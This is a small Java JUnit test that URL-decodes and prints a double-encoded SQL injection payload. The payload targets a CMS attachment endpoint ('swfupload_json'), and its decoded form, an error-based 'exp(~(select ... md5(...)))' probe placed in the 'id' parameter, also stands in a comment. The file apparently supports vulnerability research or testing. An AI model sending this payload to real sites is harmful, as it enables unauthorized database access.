package test;

import org.junit.Test;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;

/**
 * Created by Administrator on 2018/2/28.
 * Description:
 */
public class TestUrl {
    @Test
    public void test(){
        try {
            //m=attachment&c=attachments&a=swfupload_json&aid=1&src=&id='and exp(~(select%2afrom(select concat(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6
            String s = URLDecoder.decode("m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%27and%20exp(~(select%252afrom(select+concat(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6", "UTF-8");
            System.out.println(s);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }
}
